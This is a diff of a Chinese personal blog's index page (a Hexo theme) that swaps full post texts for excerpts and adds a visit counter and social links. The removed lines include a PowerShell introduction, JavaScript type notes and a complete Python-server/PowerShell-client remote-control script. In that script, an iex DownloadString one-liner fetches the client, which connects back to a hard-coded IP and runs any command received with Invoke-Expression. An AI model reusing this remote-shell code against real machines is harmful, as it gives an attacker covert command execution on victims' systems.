@@ -52,6 +52,8 @@
 
 
 
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
 
 </head>
 <body>
@@ -401,49 +403,14 @@ Command *”获取所有 Windows PowerShell 元素以及 <span class="keyword">P
             
                 
                     <h2 id="PowerShell简介">PowerShell简介</h2><h3 id="PowerShell是什么？">PowerShell是什么？</h3><p>PowerShell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境。<br>相比Linux里的shell，Windows自带的cmd命令提示符显得有些简陋，所以从Windows 7之后微软提供了cmd的超级升级版——PowerShell。</p>
-<h3 id="怎么安装PowerShell？">怎么安装PowerShell？</h3><p>大部分情况下是不需要安装的</p>
-<p>Windows 7/Windows Server 2008 内置PowerShell 2.0 <br><br>Windows 8/Windows Server 2012 内置PowerShell 3.0 <br><br>Windows 8.1/Windows Server 2012 R2 内置 PowerShell 4.0 <br><br>Windows 10 内置PowerShell 5.0预览版 <br></p>
-<p>使用$psversiontable变量可以查看PowerShell，.net框架的版本。</p>
-<pre><code>PS C:\Users\Admin&gt; $psversiontable
-
-Name   Value
-----   -----
-CLRVersion <span class="number">2.0</span><span class="number">.50727</span><span class="number">.5485</span>
-BuildVersion   <span class="number">6.1</span><span class="number">.7601</span><span class="number">.17514</span>
-PSVersion  <span class="number">2.0</span>
-WSManStackVersion  <span class="number">2.0</span>
-PSCompatibleVersions   {<span class="number">1.0</span>, <span class="number">2.0</span>}
-SerializationVersion   <span class="number">1.1</span><span class="number">.0</span><span class="number">.1</span>
-PSRemotingProtocolVersion  <span class="number">2.1</span>
-</code></pre><p>PowerShell 2.0已经可以满足大部分需求了，<strong>如果需要新版本升级到这里下载</strong>：<br></p>
-<blockquote>
-<p>PowerShell4.0 MSDN官方下载地址： <a href="https://www.microsoft.com/en-us/download/details.aspx?id=40855" target="_blank" rel="external">https://www.microsoft.com/en-us/download/details.aspx?id=40855</a></p>
-</blockquote>
-<h3 id="PowerShell有哪些功能和特点？">PowerShell有哪些功能和特点？</h3><ul>
-<li>PowerShell传递的是.net Object（PSObject），这与LinuxShell、CMD完全不同</li>
-<li>PowerShell有完整的强类型支持</li>
-<li>PowerShell和.net 还有COM、WMI、ADSI是无缝结合的</li>
-<li>PowerShell支持CMD原有的所有命令</li>
-<li>PowerShell的命令叫做cmdlet，采用动词-名词的形式，不区分大小写</li>
-</ul>
-<h3 id="快速开始">快速开始</h3><p>在运行里直接输入powershell，或者在附件 -&gt; Windows PowerShell里面打开。<br><br>PS：如果在Windows7里面，这两种方式打开的PowerShell背景颜色、窗体样式不一样，但实际上它们都是同一个文件%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe，<b>没有任何区别</b>，只不过在附件里的快捷方式设置了一下背景颜色和窗体大小。</p>
-<p>按照传统，写一个最简单的hello world，<br>在这里可以使用cmd的echo命令”hello world”，也可以使用write(“hello world”)<br>或者，其实他们本质是一样的，他们都是Write-Out的别名（Alias）</p>
-<pre><code>PS C:<span class="command">\Users</span><span class="command">\Test</span>&gt; write "hello world"
-hello world
-PS C:<span class="command">\Users</span><span class="command">\Test</span>&gt; echo("hello world")
-hello world
-PS C:<span class="command">\Users</span><span class="command">\Test</span>&gt; write hello world
-hello
-world
-PS C:<span class="command">\Users</span><span class="command">\Test</span>&gt; echo "hello world"
-hello world
-</code></pre><p>执行一下你会发现与cmd里输出echo hello world还是有区别的，cmd里输出echo “hello world”会把引号也输出，而PS里加上括号/引号都会当成一个字符串输出，什么都不加时会分行输出。如上面代码所示。</p>
-<p>除了直接在Shell界面操作，也可以在文本编辑器里写了PS脚本，然后保存为.ps1格式，右键 -&gt; 以PowerShell格式运行。</p>
-<p>当然，更推荐的code环境是PowerShell ISE，Win7以上系统全部自带，在运行输入powershell ise或者在附件里打开，界面如下图：<br><img src="http://7xlizz.com1.z0.glb.clouddn.com/QQ截图20150921182557.png" alt=""></p>
-<p>简单介绍一下：最上面一栏是脚本文件编辑的，中间一栏是运行结果，第三栏是console。这个编辑器看着简单其实功能蛮多的，之后会再次详细介绍。</p>
-
-                
+                    
             
+        
+            <p class="content-link">
+                <a href="/Powershell入门系列1-介绍和开始/#more">
+                    <span class="iconfont icon-right">继续阅读</span>
+                </a>
+            </p>
         
         </div>
         
@@ -484,27 +451,14 @@ hello world
 <li>因此所有原始类型也都是伪类，都拥有toString()等object的方法</li>
 <li>object</li>
 </ul>
-<h2 id="undefined_和_null">undefined 和 null</h2><ul>
-<li>Undefined 代表未赋值的基本数据类型，Null 代表未赋值的引用数据类型</li>
-<li>Undefined 只有唯一值 undefined，Null下只有唯一的值 null （注意大小写 =。=）</li>
-<li>但是为了效率，null 作为引用数据类型，其值仍然存在栈中</li>
-<li>因此导致了 null == undefined</li>
-<li>《J高》里的说法是，值undefined实际是从null派生（继承）而来的，所以null == undefined</li>
-<li>《J高》：typeof(null)会返回object，这是Javascript最初实现中的一个错误，但一直沿用至今，现在null被认为是对象的占位符，但从技术上来说它仍然是原始值（“从技术上说null是原始值”，大概是因为null存在栈中）</li>
-<li>null 在参与数值运算时其值会自动转换为 0 ，undefined参与任何数值运算时，结果为NaN</li>
-<li>当函数无明确返回值时，返回的值是undefined</li>
-</ul>
-<h2 id="对象和函数">对象和函数</h2><ul>
-<li>对象是一个无序属性的集合，这些属性的值位简单数据类型、对象或者函数。</li>
-<li>函数是对象的一种，实现上内部熟悉[[Class]]的值位 “Function” ，表明它是函数类型，除了对象的内部属性方法外，还有[[Construct]]、[[Call]]、[[Scope]]等内部属性。内部方法[[Construct]]用于实现作为构造器的逻辑，[[Call]]实现作为函数调用的逻辑。</li>
-<li>Function是函数类型的用户接口</li>
-<li>Object是对象类型的用户接口</li>
-<li>Boolean，Number，String均为这三种简单数值类型的<strong>对象包装器</strong></li>
-<li>Date, Array, RegExp: 可以把它们看作是几种内置的扩展数据类型</li>
-</ul>
-
-                
+                    
             
+        
+            <p class="content-link">
+                <a href="/深入理解JS笔记 1：数据类型Tips/#more">
+                    <span class="iconfont icon-right">继续阅读</span>
+                </a>
+            </p>
         
         </div>
         
@@ -534,151 +488,15 @@ hello world
             
                 
                     <h2 id="简介">简介</h2><p>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
-<p>这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。<br>其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。</p>
-<h2 id="原理">原理</h2><p><code>iex (New-Object Sys.Net.Webclient).DownloadString(&quot;http://IP:Port/connect&quot;)</code> </p>
-<ul>
-<li>用PowerShell上面的命令发Http请求得到客户端代码并用IEX命令执行</li>
-<li>客户端再次与服务端建立TCP链接，执行接收到的代码并返回处理结果</li>
-<li>服务端通过建立连接后收到的第一段数据判断是哪一种请求</li>
-</ul>
-<p>客户端代码完全可以放在Github或者其他Web服务器上，用同一个服务器与端口纯粹是为了快速搭建。</p>
-<h2 id="TODO">TODO</h2><ul>
-<li>客户端增加注册表操作</li>
-<li>优化文件上传下载</li>
-<li>客户端的异常处理</li>
-</ul>
-<h2 id="代码">代码</h2><pre><code><span class="comment"># 这里只发个主要思路，直接用并不靠谱，我后续还改过很多代码。</span>
-<span class="comment"># -*- coding:utf-8 -*-</span>
-<span class="keyword">import</span> sys
-<span class="keyword">import</span> socket
-<span class="keyword">import</span> threading
-
-<span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:
-    port = int(sys.argv[<span class="number">1</span>])
-<span class="keyword">else</span>:
-    sys.exit(<span class="string">"Usage: server.py &lt;port&gt;"</span>)
-
-allConnections = []
-allAddresses = []
-
-
-<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
-    threadCommand = threading.Thread(target=get_command)
-    threadCommand.start()
-    threadService = threading.Thread(target=service)
-    threadService.start()
-
-
-<span class="comment"># 接受输入参数与控制命令</span>
-<span class="function"><span class="keyword">def</span> <span class="title">get_command</span><span class="params">()</span>:</span>
-    <span class="keyword">while</span> <span class="number">1</span>:
-        command = raw_input(<span class="string">"&gt; "</span>)
-        <span class="keyword">if</span> command == <span class="string">"list"</span>:
-            <span class="keyword">print</span> <span class="string">"pk------------address-----------------port"</span>
-            pk = <span class="number">1</span>
-            <span class="keyword">for</span> i <span class="keyword">in</span> allAddresses:
-                <span class="keyword">print</span> str(pk) + <span class="string">"------"</span> + str(i[<span class="number">0</span>]) + <span class="string">"---------"</span> + str(i[<span class="number">1</span>])
-                pk += <span class="number">1</span>
-        <span class="keyword">elif</span> command.startswith(<span class="string">"c"</span>):
-            <span class="keyword">try</span>:
-                pk = int(command[<span class="number">2</span>:]) - <span class="number">1</span>
-            <span class="keyword">except</span>:
-                <span class="keyword">print</span> <span class="string">"usage:c &lt;client_pk&gt;"</span>
-
-            <span class="keyword">while</span> <span class="number">1</span>:
-                <span class="keyword">try</span>:
-                    msg = raw_input(<span class="string">"control %s:%s&gt; "</span> % (allAddresses[pk][<span class="number">0</span>], allAddresses[pk][<span class="number">1</span>]))
-                    allConnections[pk].send(msg)
-                    allConnections[pk].settimeout(<span class="number">5</span>)
-                    result = allConnections[pk].recv(<span class="number">1024</span>)
-                    result = result.decode(<span class="string">'utf8'</span>)
-                    <span class="keyword">print</span> result
-
-                <span class="keyword">except</span> KeyboardInterrupt:
-                    <span class="keyword">print</span> <span class="string">"Catch C-c"</span>
-                    <span class="keyword">break</span>
-                <span class="keyword">except</span> Exception, e:
-                    <span class="keyword">print</span> <span class="string">"error:"</span> + str(e)
-                    <span class="keyword">break</span>
-
-
-<span class="comment"># Socket服务进程，如果Request里包含connect，用Http返回PowerShell客户端的代码</span>
-<span class="comment"># 如果Request不包含connect，说明是后续的TCP连接成功，添加进已连接的客户端数组</span>
-<span class="function"><span class="keyword">def</span> <span class="title">service</span><span class="params">()</span>:</span>
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.bind((<span class="string">''</span>, port))
-    sock.listen(<span class="number">5</span>)
-    <span class="keyword">while</span> <span class="number">1</span>:
-        <span class="keyword">try</span>:
-            conn, addr = sock.accept()
-            conn.setblocking(<span class="number">1</span>)
-            <span class="keyword">if</span> conn:
-                request = conn.recv(<span class="number">23</span>)
-            <span class="keyword">print</span> request
-            <span class="keyword">if</span> request.find(<span class="string">"/connect"</span>) &gt; <span class="number">0</span>:
-                http_message(keep_connect(<span class="string">"192.168.199.100"</span>, port), conn)
-            <span class="keyword">else</span>:
-                allConnections.append(conn)
-                allAddresses.append(addr)
-                <span class="keyword">print</span> <span class="string">"Connected with "</span> + addr[<span class="number">0</span>] + <span class="string">":"</span> + str(addr[<span class="number">1</span>])
-        <span class="keyword">except</span> Exception, e:
-            <span class="keyword">print</span> <span class="string">"error:"</span> + str(e)
-            <span class="keyword">break</span>
-
-
-<span class="comment"># PowerShell客户端的代码，与服务端用TCP连接，Iex执行接受的数据并返回执行结果</span>
-<span class="function"><span class="keyword">def</span> <span class="title">keep_connect</span><span class="params">(ip, port)</span>:</span>
-    message = <span class="string">'$client = New-Object System.Net.Sockets.TcpClient("%s",%d)'</span> % (ip, port)
-    message += <span class="string">'''
-                $stream = $client.GetStream()
-                [byte[]]$bytes = 0..65535|%{0}
-                if ($stream.CanWrite)
-                {
-                            $sendBytes = ([text.encoding]::ASCII).GetBytes("rat")
-                            $stream.Write($sendBytes, 0, $sendBytes.Length)
-                            while (1)
-                            {
-                                 try{
-                                     $data = $stream.read($bytes, 0, $bytes.Length)
-                                     $EncodedText = New-Object -TypeName System.Text.UTF8Encoding
-                                     $info = $EncodedText.GetString($bytes,0, $data)
-                                     $sendback = (Invoke-Expression -Command $info 2&gt;&amp;1 | Out-String )
-                                     $sendbackBytes = ([text.encoding]::UTF8).GetBytes($sendback)
-                                     $stream.Write($sendbackBytes,0,$sendbackBytes.Length)
-                                     write($info)
-                                 }
-                                 catch
-                                 {
-                                     Write-Error $_
-                                     continue
-                                 }
-                            }
-                }
-                else
-                {       }
-          '''</span>
-    <span class="keyword">return</span> message
-
-
-<span class="function"><span class="keyword">def</span> <span class="title">http_message</span><span class="params">(msg, conn)</span>:</span>
-    <span class="keyword">try</span>:
-        httpHead = <span class="string">"HTTP/1.1 200 OK\r\n"</span>
-        httpHead += <span class="string">"Content-type: text/html; charset=utf-8\r\n"</span>
-        httpHead += <span class="string">"Connection: Keep-Alive\r\n"</span>
-        httpHead += <span class="string">"Server: test\r\n"</span>
-        httpHead += <span class="string">"Content-Length: %d\r\n"</span> % len(msg)
-        httpHead += <span class="string">"\r\n"</span>
-
-        conn.send(httpHead + msg)
-        <span class="keyword">return</span> <span class="number">1</span>
-    <span class="keyword">except</span>:
-        <span class="keyword">return</span> <span class="number">0</span>
-
-
-main()
-</code></pre>
-                
+<p>这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。<br>其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。<br>
+                    
             
+        
+            <p class="content-link">
+                <a href="/Python-PowerShell-一句话远控脚本思路/#more">
+                    <span class="iconfont icon-right">继续阅读</span>
+                </a>
+            </p>
         
         </div>
         
@@ -707,13 +525,43 @@ main()
     
     
     
+        
+        
+            <a href="https://weibo.com/woostundy" class="iconfont icon-weibo" title="weibo"></a>
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+            <a href="https://www.zhihu.com/people/shitao" class="iconfont icon-zhihu" title="zhihu"></a>
+        
+        
+        
+        
+    
+        
+            <a href="https://github.com/woostundy" class="iconfont icon-github" title="github"></a>
+        
+        
+        
+        
+        
+        
+        
+    
 </div>
         </div>
         <div class="right">
             <div class="copyright">
     <div class="info">
         <span>&copy;</span>
-        <span>1970 ~ 2017</span>
+        <span>2015 ~ 2017</span>
         <span>❤</span>
         <span></span>
     </div>
@@ -726,6 +574,13 @@ main()
             樣式
             <a href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
         </span>
+    </div>
+    
+    <div class="visit_count">
+        <i class="iconfont icon-visit"></i>
+        <span id="busuanzi_value_site_uv"></span>
+        <i class="iconfont icon-people"></i>
+        <span id="busuanzi_value_site_pv"></span>
     </div>
     
 </div>
